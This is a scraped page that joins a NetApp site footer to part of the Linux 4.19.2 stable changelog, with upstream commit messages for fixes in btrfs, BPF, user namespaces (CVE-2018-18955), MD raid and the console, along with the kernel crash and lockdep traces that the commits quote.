Engage

* [Contact us](/company/contact-us/)
* [Site feedback](https://listening.netapp.com/jfe/form/SV_dcilAAaRGF9r95A)
* [Accessibility](https://www.netapp.com/company/legal/accessibility/)
* [Email subscriptions](/utility/subscribe/)

* © 2025 NetApp

* [Terms of use](/company/legal/terms-of-use/)
* [Privacy policy](/company/legal/privacy-policy/)
* [Cookie policy](/company/legal/cookie-policy/)
* Cookie Settings
* [Modern Slavery Statement](/pdf.html?item=/media/107863-netapp-slavery-and-human-trafficking-statement.pdf)
* [Legal](/company/legal/)

Follow Us

Follow Us

* [Facebook](https://www.facebook.com/NetApp)
* [Instagram](https://www.instagram.com/netapp/)
* [LinkedIn](https://www.linkedin.com/company/netapp)
* [Twitter](https://twitter.com/netapp)

![Drift chat loading](https://www.netapp.com/media/drift-icon-shadow_tcm19-70572.png)



=== Content from cdn.kernel.org_b5715e1d_20250124_213104.html ===
commit 7950eb316adf792283cac5743dfe5a11e74833dc
Author: Greg Kroah-Hartman
Date: Tue Nov 13 11:09:00 2018 -0800
Linux 4.19.2
commit 589c375032fc7e0d90ba554f2f16414401034eb3
Author: Shaohua Li
Date: Sun Oct 14 17:05:07 2018 -0700
MD: fix invalid stored role for a disk - try2
commit 9e753ba9b9b405e3902d9f08aec5f2ea58a0c317 upstream.
Commit d595567dc4f0 (MD: fix invalid stored role for a disk) broke linear
hotadd. Let's only fix the role for disks in raid1/10.
Based on Guoqing's original patch.
Reported-by: kernel test robot
Cc: Gioh Kim
Cc: Guoqing Jiang
Signed-off-by: Shaohua Li
Signed-off-by: Greg Kroah-Hartman
commit fcd90d7dea56f968cc540ba5b500700449799be8
Author: Takashi Iwai
Date: Mon Nov 5 11:52:50 2018 +0100
vga\_switcheroo: Fix missing gpu\_bound call at audio client registration
commit fc09ab7a767394f9ecdad84ea6e85d68b83c8e21 upstream.
The commit 37a3a98ef601 ("ALSA: hda - Enable runtime PM only for
discrete GPU") added a new ops gpu\_bound to be called when GPU gets
bound. The patch overlooked, however, that vga\_switcheroo\_enable() is
called only once at GPU is bound. When an audio client is registered
after that point, it would miss the gpu\_bound call. This leads to the
unexpected lack of runtime PM in HD-audio side.
For addressing that regression, just call gpu\_bound callback manually
at vga\_switcheroo\_register\_audio\_client() when the GPU was already
bound.
Bugzilla: https://bugzilla.kernel.org/show\_bug.cgi?id=201615
Fixes: 37a3a98ef601 ("ALSA: hda - Enable runtime PM only for discrete GPU")
Cc:
Reviewed-by: Lukas Wunner
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit 34d9615249671e901522c43297e1ba2ca7b54899
Author: Daniel Colascione
Date: Fri Oct 12 03:54:27 2018 -0700
bpf: wait for running BPF programs when updating map-in-map
commit 1ae80cf31938c8f77c37a29bbe29e7f1cd492be8 upstream.
The map-in-map frequently serves as a mechanism for atomic
snapshotting of state that a BPF program might record. The current
implementation is dangerous to use in this way, however, since
userspace has no way of knowing when all programs that might have
retrieved the "old" value of the map may have completed.
This change ensures that map update operations on map-in-map map types
always wait for all references to the old map to drop before returning
to userspace.
Signed-off-by: Daniel Colascione
Reviewed-by: Joel Fernandes (Google)
Signed-off-by: Alexei Starovoitov
Signed-off-by: Chenbo Feng
Signed-off-by: Greg Kroah-Hartman
commit 9a7a80fb02cc7515b273dbb4249374d6e6a35b70
Author: Jann Horn
Date: Mon Nov 5 20:55:09 2018 +0100
userns: also map extents in the reverse map to kernel IDs
commit d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd upstream.
The current logic first clones the extent array and sorts both copies, then
maps the lower IDs of the forward mapping into the lower namespace, but
doesn't map the lower IDs of the reverse mapping.
This means that code in a nested user namespace with >5 extents will see
incorrect IDs. It also breaks some access checks, like
inode\_owner\_or\_capable() and privileged\_wrt\_inode\_uidgid(), so a process
can incorrectly appear to be capable relative to an inode.
To fix it, we have to make sure that the "lower\_first" members of extents
in both arrays are translated; and we have to make sure that the reverse
map is sorted \*after\* the translation (since otherwise the translation can
break the sorting).
This is CVE-2018-18955.
Fixes: 6397fac4915a ("userns: bump idmap limits to 340")
Cc: stable@vger.kernel.org
Signed-off-by: Jann Horn
Tested-by: Eric W. Biederman
Reviewed-by: Eric W. Biederman
Signed-off-by: Eric W. Biederman
Signed-off-by: Greg Kroah-Hartman
commit 13794b24ef4eac7951018630b0434d24b7a2f808
Author: Mikulas Patocka
Date: Tue Oct 23 11:28:28 2018 -0400
vt: fix broken display when running aptitude
commit 943210ba807ec50aafa2fa7b13bd6d36a478969b upstream.
If you run aptitude on framebuffer console, the display is corrupted. The
corruption is caused by the commit d8ae7242. The patch adds "offset" to
"start" when calling scr\_memsetw, but it forgets to do the same addition
on a subsequent call to do\_update\_region.
Signed-off-by: Mikulas Patocka
Fixes: d8ae72427187 ("vt: preserve unicode values corresponding to screen characters")
Reviewed-by: Nicolas Pitre
Cc: stable@vger.kernel.org # 4.19
Signed-off-by: Greg Kroah-Hartman
commit ab5d01b6130a4faa37a393cf828c6f65c45e7251
Author: David Ahern
Date: Wed Oct 24 08:32:49 2018 -0700
net: sched: Remove TCA\_OPTIONS from policy
commit e72bde6b66299602087c8c2350d36a525e75d06e upstream.
Marco reported an error with hfsc:
root@Calimero:~# tc qdisc add dev eth0 root handle 1:0 hfsc default 1
Error: Attribute failed policy validation.
Apparently a few implementations pass TCA\_OPTIONS as a binary instead
of nested attribute, so drop TCA\_OPTIONS from the policy.
Fixes: 8b4c3cdd9dd8 ("net: sched: Add policy validation for tc attributes")
Reported-by: Marco Berizzi
Signed-off-by: David Ahern
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 0c286e9d164b4b29a50a608ef83dfd7dc312e8b2
Author: Filipe Manana
Date: Mon Oct 22 10:43:06 2018 +0100
Btrfs: fix use-after-free when dumping free space
commit 9084cb6a24bf5838a665af92ded1af8363f9e563 upstream.
We were iterating a block group's free space cache rbtree without locking
first the lock that protects it (the free\_space\_ctl->free\_space\_offset
rbtree is protected by the free\_space\_ctl->tree\_lock spinlock).
KASAN reported an use-after-free problem when iterating such a rbtree due
to a concurrent rbtree delete:
[ 9520.359168] ==================================================================
[ 9520.359656] BUG: KASAN: use-after-free in rb\_next+0x13/0x90
[ 9520.359949] Read of size 8 at addr ffff8800b7ada500 by task btrfs-transacti/1721
[ 9520.360357]
[ 9520.360530] CPU: 4 PID: 1721 Comm: btrfs-transacti Tainted: G L 4.19.0-rc8-nbor #555
[ 9520.360990] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[ 9520.362682] Call Trace:
[ 9520.362887] dump\_stack+0xa4/0xf5
[ 9520.363146] print\_address\_description+0x78/0x280
[ 9520.363412] kasan\_report+0x263/0x390
[ 9520.363650] ? rb\_next+0x13/0x90
[ 9520.363873] \_\_asan\_load8+0x54/0x90
[ 9520.364102] rb\_next+0x13/0x90
[ 9520.364380] btrfs\_dump\_free\_space+0x146/0x160 [btrfs]
[ 9520.364697] dump\_space\_info+0x2cd/0x310 [btrfs]
[ 9520.364997] btrfs\_reserve\_extent+0x1ee/0x1f0 [btrfs]
[ 9520.365310] \_\_btrfs\_prealloc\_file\_range+0x1cc/0x620 [btrfs]
[ 9520.365646] ? btrfs\_update\_time+0x180/0x180 [btrfs]
[ 9520.365923] ? \_raw\_spin\_unlock+0x27/0x40
[ 9520.366204] ? btrfs\_alloc\_data\_chunk\_ondemand+0x2c0/0x5c0 [btrfs]
[ 9520.366549] btrfs\_prealloc\_file\_range\_trans+0x23/0x30 [btrfs]
[ 9520.366880] cache\_save\_setup+0x42e/0x580 [btrfs]
[ 9520.367220] ? btrfs\_check\_data\_free\_space+0xd0/0xd0 [btrfs]
[ 9520.367518] ? lock\_downgrade+0x2f0/0x2f0
[ 9520.367799] ? btrfs\_write\_dirty\_block\_groups+0x11f/0x6e0 [btrfs]
[ 9520.368104] ? kasan\_check\_read+0x11/0x20
[ 9520.368349] ? do\_raw\_spin\_unlock+0xa8/0x140
[ 9520.368638] btrfs\_write\_dirty\_block\_groups+0x2af/0x6e0 [btrfs]
[ 9520.368978] ? btrfs\_start\_dirty\_block\_groups+0x870/0x870 [btrfs]
[ 9520.369282] ? do\_raw\_spin\_unlock+0xa8/0x140
[ 9520.369534] ? \_raw\_spin\_unlock+0x27/0x40
[ 9520.369811] ? btrfs\_run\_delayed\_refs+0x1b8/0x230 [btrfs]
[ 9520.370137] commit\_cowonly\_roots+0x4b9/0x610 [btrfs]
[ 9520.370560] ? commit\_fs\_roots+0x350/0x350 [btrfs]
[ 9520.370926] ? btrfs\_run\_delayed\_refs+0x1b8/0x230 [btrfs]
[ 9520.371285] btrfs\_commit\_transaction+0x5e5/0x10e0 [btrfs]
[ 9520.371612] ? btrfs\_apply\_pending\_changes+0x90/0x90 [btrfs]
[ 9520.371943] ? start\_transaction+0x168/0x6c0 [btrfs]
[ 9520.372257] transaction\_kthread+0x21c/0x240 [btrfs]
[ 9520.372537] kthread+0x1d2/0x1f0
[ 9520.372793] ? btrfs\_cleanup\_transaction+0xb50/0xb50 [btrfs]
[ 9520.373090] ? kthread\_park+0xb0/0xb0
[ 9520.373329] ret\_from\_fork+0x3a/0x50
[ 9520.373567]
[ 9520.373738] Allocated by task 1804:
[ 9520.373974] kasan\_kmalloc+0xff/0x180
[ 9520.374208] kasan\_slab\_alloc+0x11/0x20
[ 9520.374447] kmem\_cache\_alloc+0xfc/0x2d0
[ 9520.374731] \_\_btrfs\_add\_free\_space+0x40/0x580 [btrfs]
[ 9520.375044] unpin\_extent\_range+0x4f7/0x7a0 [btrfs]
[ 9520.375383] btrfs\_finish\_extent\_commit+0x15f/0x4d0 [btrfs]
[ 9520.375707] btrfs\_commit\_transaction+0xb06/0x10e0 [btrfs]
[ 9520.376027] btrfs\_alloc\_data\_chunk\_ondemand+0x237/0x5c0 [btrfs]
[ 9520.376365] btrfs\_check\_data\_free\_space+0x81/0xd0 [btrfs]
[ 9520.376689] btrfs\_delalloc\_reserve\_space+0x25/0x80 [btrfs]
[ 9520.377018] btrfs\_direct\_IO+0x42e/0x6d0 [btrfs]
[ 9520.377284] generic\_file\_direct\_write+0x11e/0x220
[ 9520.377587] btrfs\_file\_write\_iter+0x472/0xac0 [btrfs]
[ 9520.377875] aio\_write+0x25c/0x360
[ 9520.378106] io\_submit\_one+0xaa0/0xdc0
[ 9520.378343] \_\_se\_sys\_io\_submit+0xfa/0x2f0
[ 9520.378589] \_\_x64\_sys\_io\_submit+0x43/0x50
[ 9520.378840] do\_syscall\_64+0x7d/0x240
[ 9520.379081] entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
[ 9520.379387]
[ 9520.379557] Freed by task 1802:
[ 9520.379782] \_\_kasan\_slab\_free+0x173/0x260
[ 9520.380028] kasan\_slab\_free+0xe/0x10
[ 9520.380262] kmem\_cache\_free+0xc1/0x2c0
[ 9520.380544] btrfs\_find\_space\_for\_alloc+0x4cd/0x4e0 [btrfs]
[ 9520.380866] find\_free\_extent+0xa99/0x17e0 [btrfs]
[ 9520.381166] btrfs\_reserve\_extent+0xd5/0x1f0 [btrfs]
[ 9520.381474] btrfs\_get\_blocks\_direct+0x60b/0xbd0 [btrfs]
[ 9520.381761] \_\_blockdev\_direct\_IO+0x10ee/0x58a1
[ 9520.382059] btrfs\_direct\_IO+0x25a/0x6d0 [btrfs]
[ 9520.382321] generic\_file\_direct\_write+0x11e/0x220
[ 9520.382623] btrfs\_file\_write\_iter+0x472/0xac0 [btrfs]
[ 9520.382904] aio\_write+0x25c/0x360
[ 9520.383172] io\_submit\_one+0xaa0/0xdc0
[ 9520.383416] \_\_se\_sys\_io\_submit+0xfa/0x2f0
[ 9520.383678] \_\_x64\_sys\_io\_submit+0x43/0x50
[ 9520.383927] do\_syscall\_64+0x7d/0x240
[ 9520.384165] entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
[ 9520.384439]
[ 9520.384610] The buggy address belongs to the object at ffff8800b7ada500
which belongs to the cache btrfs\_free\_space of size 72
[ 9520.385175] The buggy address is located 0 bytes inside of
72-byte region [ffff8800b7ada500, ffff8800b7ada548)
[ 9520.385691] The buggy address belongs to the page:
[ 9520.385957] page:ffffea0002deb680 count:1 mapcount:0 mapping:ffff880108a1d700 index:0x0 compound\_mapcount: 0
[ 9520.388030] flags: 0x8100(slab|head)
[ 9520.388281] raw: 0000000000008100 ffffea0002deb608 ffffea0002728808 ffff880108a1d700
[ 9520.388722] raw: 0000000000000000 0000000000130013 00000001ffffffff 0000000000000000
[ 9520.389169] page dumped because: kasan: bad access detected
[ 9520.389473]
[ 9520.389658] Memory state around the buggy address:
[ 9520.389943] ffff8800b7ada400: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[ 9520.390368] ffff8800b7ada480: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[ 9520.390796] >ffff8800b7ada500: fb fb fb fb fb fb fb fb fb fc fc fc fc fc fc fc
[ 9520.391223] ^
[ 9520.391461] ffff8800b7ada580: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[ 9520.391885] ffff8800b7ada600: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[ 9520.392313] ==================================================================
[ 9520.392772] BTRFS critical (device vdc): entry offset 2258497536, bytes 131072, bitmap no
[ 9520.393247] BUG: unable to handle kernel NULL pointer dereference at 0000000000000011
[ 9520.393705] PGD 800000010dbab067 P4D 800000010dbab067 PUD 107551067 PMD 0
[ 9520.394059] Oops: 0000 [#1] SMP DEBUG\_PAGEALLOC KASAN PTI
[ 9520.394378] CPU: 4 PID: 1721 Comm: btrfs-transacti Tainted: G B L 4.19.0-rc8-nbor #555
[ 9520.394858] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[ 9520.395350] RIP: 0010:rb\_next+0x3c/0x90
[ 9520.396461] RSP: 0018:ffff8801074ff780 EFLAGS: 00010292
[ 9520.396762] RAX: 0000000000000000 RBX: 0000000000000001 RCX: ffffffff81b5ac4c
[ 9520.397115] RDX: 0000000000000000 RSI: 0000000000000008 RDI: 0000000000000011
[ 9520.397468] RBP: ffff8801074ff7a0 R08: ffffed0021d64ccc R09: ffffed0021d64ccc
[ 9520.397821] R10: 0000000000000001 R11: ffffed0021d64ccb R12: ffff8800b91e0000
[ 9520.398188] R13: ffff8800a3ceba48 R14: ffff8800b627bf80 R15: 0000000000020000
[ 9520.398555] FS: 0000000000000000(0000) GS:ffff88010eb00000(0000) knlGS:0000000000000000
[ 9520.399007] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 9520.399335] CR2: 0000000000000011 CR3: 0000000106b52000 CR4: 00000000000006a0
[ 9520.399679] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[ 9520.400023] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[ 9520.400400] Call Trace:
[ 9520.400648] btrfs\_dump\_free\_space+0x146/0x160 [btrfs]
[ 9520.400974] dump\_space\_info+0x2cd/0x310 [btrfs]
[ 9520.401287] btrfs\_reserve\_extent+0x1ee/0x1f0 [btrfs]
[ 9520.401609] \_\_btrfs\_prealloc\_file\_range+0x1cc/0x620 [btrfs]
[ 9520.401952] ? btrfs\_update\_time+0x180/0x180 [btrfs]
[ 9520.402232] ? \_raw\_spin\_unlock+0x27/0x40
[ 9520.402522] ? btrfs\_alloc\_data\_chunk\_ondemand+0x2c0/0x5c0 [btrfs]
[ 9520.402882] btrfs\_prealloc\_file\_range\_trans+0x23/0x30 [btrfs]
[ 9520.403261] cache\_save\_setup+0x42e/0x580 [btrfs]
[ 9520.403570] ? btrfs\_check\_data\_free\_space+0xd0/0xd0 [btrfs]
[ 9520.403871] ? lock\_downgrade+0x2f0/0x2f0
[ 9520.404161] ? btrfs\_write\_dirty\_block\_groups+0x11f/0x6e0 [btrfs]
[ 9520.404481] ? kasan\_check\_read+0x11/0x20
[ 9520.404732] ? do\_raw\_spin\_unlock+0xa8/0x140
[ 9520.405026] btrfs\_write\_dirty\_block\_groups+0x2af/0x6e0 [btrfs]
[ 9520.405375] ? btrfs\_start\_dirty\_block\_groups+0x870/0x870 [btrfs]
[ 9520.405694] ? do\_raw\_spin\_unlock+0xa8/0x140
[ 9520.405958] ? \_raw\_spin\_unlock+0x27/0x40
[ 9520.406243] ? btrfs\_run\_delayed\_refs+0x1b8/0x230 [btrfs]
[ 9520.406574] commit\_cowonly\_roots+0x4b9/0x610 [btrfs]
[ 9520.406899] ? commit\_fs\_roots+0x350/0x350 [btrfs]
[ 9520.407253] ? btrfs\_run\_delayed\_refs+0x1b8/0x230 [btrfs]
[ 9520.407589] btrfs\_commit\_transaction+0x5e5/0x10e0 [btrfs]
[ 9520.407925] ? btrfs\_apply\_pending\_changes+0x90/0x90 [btrfs]
[ 9520.408262] ? start\_transaction+0x168/0x6c0 [btrfs]
[ 9520.408582] transaction\_kthread+0x21c/0x240 [btrfs]
[ 9520.408870] kthread+0x1d2/0x1f0
[ 9520.409138] ? btrfs\_cleanup\_transaction+0xb50/0xb50 [btrfs]
[ 9520.409440] ? kthread\_park+0xb0/0xb0
[ 9520.409682] ret\_from\_fork+0x3a/0x50
[ 9520.410508] Dumping ftrace buffer:
[ 9520.410764] (ftrace buffer empty)
[ 9520.411007] CR2: 0000000000000011
[ 9520.411297] ---[ end trace 01a0863445cf360a ]---
[ 9520.411568] RIP: 0010:rb\_next+0x3c/0x90
[ 9520.412644] RSP: 0018:ffff8801074ff780 EFLAGS: 00010292
[ 9520.412932] RAX: 0000000000000000 RBX: 0000000000000001 RCX: ffffffff81b5ac4c
[ 9520.413274] RDX: 0000000000000000 RSI: 0000000000000008 RDI: 0000000000000011
[ 9520.413616] RBP: ffff8801074ff7a0 R08: ffffed0021d64ccc R09: ffffed0021d64ccc
[ 9520.414007] R10: 0000000000000001 R11: ffffed0021d64ccb R12: ffff8800b91e0000
[ 9520.414349] R13: ffff8800a3ceba48 R14: ffff8800b627bf80 R15: 0000000000020000
[ 9520.416074] FS: 0000000000000000(0000) GS:ffff88010eb00000(0000) knlGS:0000000000000000
[ 9520.416536] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 9520.416848] CR2: 0000000000000011 CR3: 0000000106b52000 CR4: 00000000000006a0
[ 9520.418477] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[ 9520.418846] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[ 9520.419204] Kernel panic - not syncing: Fatal exception
[ 9520.419666] Dumping ftrace buffer:
[ 9520.419930] (ftrace buffer empty)
[ 9520.420168] Kernel Offset: disabled
[ 9520.420406] ---[ end Kernel panic - not syncing: Fatal exception ]---
Fix this by acquiring the respective lock before iterating the rbtree.
Reported-by: Nikolay Borisov
CC: stable@vger.kernel.org # 4.4+
Reviewed-by: Josef Bacik
Signed-off-by: Filipe Manana
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 5b7a463003f5c1feb8a45bcd087bdf0beefdb6e1
Author: Filipe Manana
Date: Fri Oct 12 13:02:48 2018 +0100
Btrfs: fix use-after-free during inode eviction
commit 421f0922a2cfb0c75acd9746454aaa576c711a65 upstream.
At inode.c:evict\_inode\_truncate\_pages(), when we iterate over the
inode's extent states, we access an extent state record's "state" field
after we unlocked the inode's io tree lock. This can lead to a
use-after-free issue because after we unlock the io tree that extent
state record might have been freed due to being merged into another
adjacent extent state record (a previous inflight bio for a read
operation finished in the meanwhile which unlocked a range in the io
tree and cause a merge of extent state records, as explained in the
comment before the while loop added in commit 6ca0709756710 ("Btrfs: fix
hang during inode eviction due to concurrent readahead")).
Fix this by keeping a copy of the extent state's flags in a local
variable and using it after unlocking the io tree.
Bugzilla: https://bugzilla.kernel.org/show\_bug.cgi?id=201189
Fixes: b9d0b38928e2 ("btrfs: Add handler for invalidate page")
CC: stable@vger.kernel.org # 4.4+
Reviewed-by: Qu Wenruo
Signed-off-by: Filipe Manana
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 51c62a33574da61e5ce33878bedf08f47e8aa207
Author: Josef Bacik
Date: Fri Oct 12 15:32:32 2018 -0400
btrfs: move the dio\_sem higher up the callchain
commit c495144bc6962186feae31d687596d2472000e45 upstream.
We're getting a lockdep splat because we take the dio\_sem under the
log\_mutex. What we really need is to protect fsync() from logging an
extent map for an extent we never waited on higher up, so just guard the
whole thing with dio\_sem.
======================================================
WARNING: possible circular locking dependency detected
4.18.0-rc4-xfstests-00025-g5de5edbaf1d4 #411 Not tainted
------------------------------------------------------
aio-dio-invalid/30928 is trying to acquire lock:
0000000092621cfd (&mm->mmap\_sem){++++}, at: get\_user\_pages\_unlocked+0x5a/0x1e0
but task is already holding lock:
00000000cefe6b35 (&ei->dio\_sem){++++}, at: btrfs\_direct\_IO+0x3be/0x400
which lock already depends on the new lock.
the existing dependency chain (in reverse order) is:
-> #5 (&ei->dio\_sem){++++}:
lock\_acquire+0xbd/0x220
down\_write+0x51/0xb0
btrfs\_log\_changed\_extents+0x80/0xa40
btrfs\_log\_inode+0xbaf/0x1000
btrfs\_log\_inode\_parent+0x26f/0xa80
btrfs\_log\_dentry\_safe+0x50/0x70
btrfs\_sync\_file+0x357/0x540
do\_fsync+0x38/0x60
\_\_ia32\_sys\_fdatasync+0x12/0x20
do\_fast\_syscall\_32+0x9a/0x2f0
entry\_SYSENTER\_compat+0x84/0x96
-> #4 (&ei->log\_mutex){+.+.}:
lock\_acquire+0xbd/0x220
\_\_mutex\_lock+0x86/0xa10
btrfs\_record\_unlink\_dir+0x2a/0xa0
btrfs\_unlink+0x5a/0xc0
vfs\_unlink+0xb1/0x1a0
do\_unlinkat+0x264/0x2b0
do\_fast\_syscall\_32+0x9a/0x2f0
entry\_SYSENTER\_compat+0x84/0x96
-> #3 (sb\_internal#2){.+.+}:
lock\_acquire+0xbd/0x220
\_\_sb\_start\_write+0x14d/0x230
start\_transaction+0x3e6/0x590
btrfs\_evict\_inode+0x475/0x640
evict+0xbf/0x1b0
btrfs\_run\_delayed\_iputs+0x6c/0x90
cleaner\_kthread+0x124/0x1a0
kthread+0x106/0x140
ret\_from\_fork+0x3a/0x50
-> #2 (&fs\_info->cleaner\_delayed\_iput\_mutex){+.+.}:
lock\_acquire+0xbd/0x220
\_\_mutex\_lock+0x86/0xa10
btrfs\_alloc\_data\_chunk\_ondemand+0x197/0x530
btrfs\_check\_data\_free\_space+0x4c/0x90
btrfs\_delalloc\_reserve\_space+0x20/0x60
btrfs\_page\_mkwrite+0x87/0x520
do\_page\_mkwrite+0x31/0xa0
\_\_handle\_mm\_fault+0x799/0xb00
handle\_mm\_fault+0x7c/0xe0
\_\_do\_page\_fault+0x1d3/0x4a0
async\_page\_fault+0x1e/0x30
-> #1 (sb\_pagefaults){.+.+}:
lock\_acquire+0xbd/0x220
\_\_sb\_start\_write+0x14d/0x230
btrfs\_page\_mkwrite+0x6a/0x520
do\_page\_mkwrite+0x31/0xa0
\_\_handle\_mm\_fault+0x799/0xb00
handle\_mm\_fault+0x7c/0xe0
\_\_do\_page\_fault+0x1d3/0x4a0
async\_page\_fault+0x1e/0x30
-> #0 (&mm->mmap\_sem){++++}:
\_\_lock\_acquire+0x42e/0x7a0
lock\_acquire+0xbd/0x220
down\_read+0x48/0xb0
get\_user\_pages\_unlocked+0x5a/0x1e0
get\_user\_pages\_fast+0xa4/0x150
iov\_iter\_get\_pages+0xc3/0x340
do\_direct\_IO+0xf93/0x1d70
\_\_blockdev\_direct\_IO+0x32d/0x1c20
btrfs\_direct\_IO+0x227/0x400
generic\_file\_direct\_write+0xcf/0x180
btrfs\_file\_write\_iter+0x308/0x58c
aio\_write+0xf8/0x1d0
io\_submit\_one+0x3a9/0x620
\_\_ia32\_compat\_sys\_io\_submit+0xb2/0x270
do\_int80\_syscall\_32+0x5b/0x1a0
entry\_INT80\_compat+0x88/0xa0
other info that might help us debug this:
Chain exists of:
&mm->mmap\_sem --> &ei->log\_mutex --> &ei->dio\_sem
Possible unsafe locking scenario:
CPU0 CPU1
---- ----
lock(&ei->dio\_sem);
lock(&ei->log\_mutex);
lock(&ei->dio\_sem);
lock(&mm->mmap\_sem);
\*\*\* DEADLOCK \*\*\*
1 lock held by aio-dio-invalid/30928:
#0: 00000000cefe6b35 (&ei->dio\_sem){++++}, at: btrfs\_direct\_IO+0x3be/0x400
stack backtrace:
CPU: 0 PID: 30928 Comm: aio-dio-invalid Not tainted 4.18.0-rc4-xfstests-00025-g5de5edbaf1d4 #411
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.11.0-2.el7 04/01/2014
Call Trace:
dump\_stack+0x7c/0xbb
print\_circular\_bug.isra.37+0x297/0x2a4
check\_prev\_add.constprop.45+0x781/0x7a0
? \_\_lock\_acquire+0x42e/0x7a0
validate\_chain.isra.41+0x7f0/0xb00
\_\_lock\_acquire+0x42e/0x7a0
lock\_acquire+0xbd/0x220
? get\_user\_pages\_unlocked+0x5a/0x1e0
down\_read+0x48/0xb0
? get\_user\_pages\_unlocked+0x5a/0x1e0
get\_user\_pages\_unlocked+0x5a/0x1e0
get\_user\_pages\_fast+0xa4/0x150
iov\_iter\_get\_pages+0xc3/0x340
do\_direct\_IO+0xf93/0x1d70
? \_\_alloc\_workqueue\_key+0x358/0x490
? \_\_blockdev\_direct\_IO+0x14b/0x1c20
\_\_blockdev\_direct\_IO+0x32d/0x1c20
? btrfs\_run\_delalloc\_work+0x40/0x40
? can\_nocow\_extent+0x490/0x490
? kvm\_clock\_read+0x1f/0x30
? can\_nocow\_extent+0x490/0x490
? btrfs\_run\_delalloc\_work+0x40/0x40
btrfs\_direct\_IO+0x227/0x400
? btrfs\_run\_delalloc\_work+0x40/0x40
generic\_file\_direct\_write+0xcf/0x180
btrfs\_file\_write\_iter+0x308/0x58c
aio\_write+0xf8/0x1d0
? kvm\_clock\_read+0x1f/0x30
? \_\_might\_fault+0x3e/0x90
io\_submit\_one+0x3a9/0x620
? io\_submit\_one+0xe5/0x620
\_\_ia32\_compat\_sys\_io\_submit+0xb2/0x270
do\_int80\_syscall\_32+0x5b/0x1a0
entry\_INT80\_compat+0x88/0xa0
CC: stable@vger.kernel.org # 4.14+
Reviewed-by: Filipe Manana
Signed-off-by: Josef Bacik
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit dd4729566e10fb822c839e4f5568f790c7a1987e
Author: Josef Bacik
Date: Thu Oct 11 15:54:31 2018 -0400
btrfs: don't run delayed\_iputs in commit
commit 30928e9baac238a7330085a1c5747f0b5df444b4 upstream.
This could result in a really bad case where we do something like
evict
evict\_refill\_and\_join
btrfs\_commit\_transaction
btrfs\_run\_delayed\_iputs
evict
evict\_refill\_and\_join
btrfs\_commit\_transaction
... forever
We have plenty of other places where we run delayed iputs that are much
safer, let those do the work.
CC: stable@vger.kernel.org # 4.4+
Reviewed-by: Filipe Manana
Signed-off-by: Josef Bacik
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 186b52489a4fc6f08a9f746c9a73a57893a2e898
Author: Josef Bacik
Date: Thu Oct 11 15:54:22 2018 -0400
btrfs: fix insert\_reserved error handling
commit 80ee54bfe8a3850015585ebc84e8d207fcae6831 upstream.
We were not handling the reserved byte accounting properly for data
references. Metadata was fine, if it errored out the error paths would
free the bytes\_reserved count and pin the extent, but it even missed one
of the error cases. So instead move this handling up into
run\_one\_delayed\_ref so we are sure that both cases are properly cleaned
up in case of a transaction abort.
CC: stable@vger.kernel.org # 4.18+
Reviewed-by: Nikolay Borisov
Signed-off-by: Josef Bacik
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 5a1e9bf45a3ce2843bd3d008d07e7de05f3fe105
Author: Josef Bacik
Date: Thu Oct 11 15:54:21 2018 -0400
btrfs: only free reserved extent if we didn't insert it
commit 49940bdd57779c78462da7aa5a8650b2fea8c2ff upstream.
When we insert the file extent once the ordered extent completes we free
the reserved extent reservation as it'll have been migrated to the
bytes\_used counter. However if we error out after this step we'll still
clear the reserved extent reservation, resulting in a negative
accounting of the reserved bytes for the block group and space info.
Fix this by only doing the free if we didn't successfully insert a file
extent for this extent.
CC: stable@vger.kernel.org # 4.14+
Reviewed-by: Omar Sandoval
Reviewed-by: Filipe Manana
Signed-off-by: Josef Bacik
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit a746cfd00197146fbefc7c2d92cddba5f3c7403d
Author: Josef Bacik
Date: Thu Oct 11 15:54:09 2018 -0400
btrfs: don't use ctl->free\_space for max\_extent\_size
commit fb5c39d7a887108087de6ff93d3f326b01b4ef41 upstream.
max\_extent\_size is supposed to be the largest contiguous range for the
space info, and ctl->free\_space is the total free space in the block
group. We need to keep track of these separately and \_only\_ use the
max\_free\_space if we don't have a max\_extent\_size, as that means our
original request was too large to search any of the block groups for and
therefore wouldn't have a max\_extent\_size set.
CC: stable@vger.kernel.org # 4.14+
Reviewed-by: Filipe Manana
Signed-off-by: Josef Bacik
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 4a351e751731e1358c7ec71b18478bbd9ebdde08
Author: Josef Bacik
Date: Fri Oct 12 15:32:33 2018 -0400
btrfs: set max\_extent\_size properly
commit ad22cf6ea47fa20fbe11ac324a0a15c0a9a4a2a9 upstream.
We can't use entry->bytes if our entry is a bitmap entry, we need to use
entry->max\_extent\_size in that case. Fix up all the logic to make this
consistent.
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Josef Bacik
Reviewed-by: David Sterba
